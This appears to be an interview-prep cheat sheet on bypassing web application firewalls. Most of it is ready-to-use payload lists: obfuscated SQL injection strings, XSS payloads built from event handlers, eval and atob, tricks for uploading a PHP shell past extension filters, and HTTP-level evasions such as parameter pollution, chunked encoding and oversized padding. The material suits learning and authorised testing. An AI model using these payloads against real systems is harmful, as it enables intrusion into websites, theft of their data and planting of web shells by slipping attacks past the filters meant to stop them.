# 🔒 WAF Bypass Encyclopedia

> *"When the interviewer asks 'What if there's a WAF?' — this is your answer arsenal."*

---

## Understanding WAFs First

**What is a WAF?** Web Application Firewall — inspects HTTP traffic and blocks requests matching known attack patterns.

**How WAFs work:**
```
User Request → WAF (pattern matching) → If suspicious → BLOCK
                                       → If clean → Pass to Server
```

**WAF weaknesses (why bypasses work):**
1. WAFs use **pattern matching** — they look for known strings, not understand context
2. WAFs parse HTTP **differently** than the application server
3. WAFs can't understand **application logic** — only suspicious-looking strings
4. WAFs have **performance budgets** — they can't inspect everything deeply

---

## SQL Injection WAF Bypasses

### Keyword Blocking Bypasses

```sql
-- UNION blocked:
UN/**/ION SEL/**/ECT           -- inline comments break keywords
uNiOn SeLeCt                   -- case variation
UNION%0aSELECT                 -- newline between keywords
UNION%09SELECT                 -- tab between keywords
/*!UNION*/ /*!SELECT*/         -- MySQL conditional comments
UNION   SELECT                 -- multiple spaces
%55NION %53ELECT               -- partial URL encoding

-- SELECT blocked:
SEL%45CT                       -- URL encode one character
SELE\CT                        -- backslash (MySQL)
(SELECT)                       -- parentheses wrapping

-- AND/OR blocked:
&&                             -- logical AND alternative
||                             -- logical OR alternative
AN%44                          -- partial encoding
```

### Quote Blocking Bypasses

```sql
-- Single quote (') blocked:
CHAR(39)                       -- MySQL char function
CHR(39)                        -- PostgreSQL/Oracle
0x27                           -- hex representation
%27                            -- URL encoding
%2527                          -- double URL encoding
CONCAT(CHAR(39))               -- function wrapping

-- String without quotes:
WHERE username = 0x61646d696e   -- hex for 'admin'
WHERE username = CHAR(97,100,109,105,110)
```

### Space Blocking Bypasses

```sql
-- Spaces blocked:
UNION/**/SELECT               -- comment as space
UNION%09SELECT                -- tab
UNION%0aSelECT                -- newline
UNION%0dSELECT                -- carriage return
UNION(SELECT)                 -- parentheses (no space needed)
UNION+SELECT                  -- plus sign
```

### Comment Blocking Bypasses

```sql
-- double dash (--) blocked:
#                              -- MySQL comment
;%00                           -- null byte
' OR '1'='1                    -- balanced quotes (no comment needed)
```

---

## XSS WAF Bypasses

### Tag-Based Bypasses

```html
<!-- <script> blocked: -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
<video><source onerror=alert(1)>
<audio src=x onerror=alert(1)>
<iframe onload=alert(1)>
<object data=javascript:alert(1)>
<embed src=javascript:alert(1)>
<math><brute href=javascript:alert(1)>click</brute></math>

<!-- Tag obfuscation: -->
<svg/onload=alert(1)>           -- / instead of space
<svg%09onload=alert(1)>         -- tab
<ScRiPt>alert(1)</ScRiPt>       -- case variation
<scr<script>ipt>alert(1)</scr</script>ipt>  -- nested (if filter removes once)
```

### Function-Based Bypasses

```html
<!-- alert() blocked: -->
<img src=x onerror=confirm(1)>
<img src=x onerror=prompt(1)>
<img src=x onerror=print()>

<!-- String construction: -->
<img src=x onerror=top['al'+'ert'](1)>
<img src=x onerror=window['alert'](1)>
<img src=x onerror=self[atob('YWxlcnQ=')](1)>     -- base64 'alert'
<img src=x onerror=eval(atob('YWxlcnQoMSk='))>    -- base64 'alert(1)'
<img src=x onerror=this[constructor][constructor]('alert(1)')()>

<!-- Function.constructor: -->
<img src=x onerror=[].constructor.constructor('alert(1)')()>
```

### Encoding-Based Bypasses

```html
<!-- HTML entity encoding: -->
<a href="&#106;avascript:alert(1)">click</a>
<a href="&#x6A;avascript:alert(1)">click</a>
<a href="jav&#x09;ascript:alert(1)">click</a>

<!-- Unicode escapes (in JS context): -->
\u0061lert(1)                   -- unicode 'a'

<!-- Double encoding: -->
%253Cscript%253E                -- %25 = %, so %253C = %3C = <

<!-- Null bytes: -->
<scr%00ipt>alert(1)</script>

<!-- Tab/newline in protocol: -->
<a href="java	script:alert(1)">    -- tab character
<a href="java
script:alert(1)">                    -- newline
```

### Event Handler Bypass List

```
onclick, ondblclick, onmousedown, onmouseup, onmouseover,
onmousemove, onmouseout, onkeypress, onkeydown, onkeyup,
onfocus, onblur, onsubmit, onreset, onselect, onchange,
onload, onerror, onunload, onresize, onscroll,
ontoggle, onpageshow, onhashchange, onsearch,
onplay, onplaying, onpause, onended, oncanplay,
onprogress, onseeked, onseeking, ontimeupdate,
ondrag, ondragend, ondragenter, ondragleave,
ondragover, ondragstart, ondrop,
oncontextmenu, oninput, oninvalid,
onwheel, oncopy, oncut, onpaste,
onanimationend, onanimationstart, ontransitionend,
onpointerdown, onpointerup, onpointermove
```

---

## File Upload WAF Bypasses

```
-- Extension bypass:
.php → .pHp, .php5, .phtml, .phar
.php → .php%00.jpg (null byte)
.php → .php. (trailing dot)
.php → .php::$DATA (Windows ADS)
.php → .php;.jpg (semicolon)

-- Content-Type manipulation:
Change Content-Type header to: image/jpeg, image/png

-- Boundary manipulation:
Content-Type: multipart/form-data; boundary=----FAKEBOUNDARY
WAF parses with one boundary, server with another

-- Chunked transfer encoding:
Transfer-Encoding: chunked
Send payload in small chunks that WAF doesn't reassemble

-- Name/filename tricks:
filename="shell.php"
filename=shell.php (no quotes)
filename='shell.php' (single quotes)
filename="shell.p\hp" (backslash)
```

---

## General WAF Bypass Techniques

### 1. HTTP Parameter Pollution (HPP)

```
# Send the same parameter multiple times
?id=1&id=2 UNION SELECT 1,2,3

# Different servers handle differently:
Apache/PHP:    takes LAST value  → id=2 UNION SELECT 1,2,3
ASP.NET/IIS:   takes ALL values → id=1,2 UNION SELECT 1,2,3
Tomcat/Java:   takes FIRST value → id=1
```

### 2. Content-Type Switching

```http
# WAF inspects application/x-www-form-urlencoded but not JSON:
POST /api/login
Content-Type: application/json

{"username": "admin' OR '1'='1", "password": "x"}
```

### 3. Chunked Transfer Encoding

```http
POST /search HTTP/1.1
Transfer-Encoding: chunked

3
sel
3
ect
1
 
4
from
0

# WAF sees chunks separately, server reassembles
```

### 4. HTTP/2 Specific

```
# HTTP/2 doesn't have the same parsing as HTTP/1.1
# Some WAFs only inspect HTTP/1.1 traffic
# Try upgrading the connection to HTTP/2
```

### 5. Request Size Overflow

```
# Some WAFs have a max inspection size
# Pad your request with junk data to exceed it
POST /search
a=AAAA....[100KB of A's]....&q=' UNION SELECT 1,2,3--
```

---

## Interview-Ready WAF Bypass Framework

When asked "What if there's a WAF?", structure your answer:

```
1. IDENTIFY:  "First, I'd identify the WAF (response headers, error pages, 
               Wafw00f tool)"

2. UNDERSTAND: "Then I'd understand what it's blocking — specific keywords, 
                patterns, or character classes?"

3. BYPASS:     "Based on what's blocked, I'd try:
                - Encoding (URL, double-URL, Unicode, HTML entities)
                - Case variation and keyword splitting
                - Alternative functions/tags that achieve the same goal
                - Protocol-level bypasses (chunked encoding, HPP)
                - Content-Type switching"

4. ITERATE:    "I'd test systematically — change one thing at a time to 
                understand exactly what the WAF is matching on"
```

---

> **Key insight for interviews:** Never say "I'd just use a WAF bypass tool." Explain the TECHNIQUE, show you understand WHY it works, and demonstrate you can think creatively when your first approach is blocked.
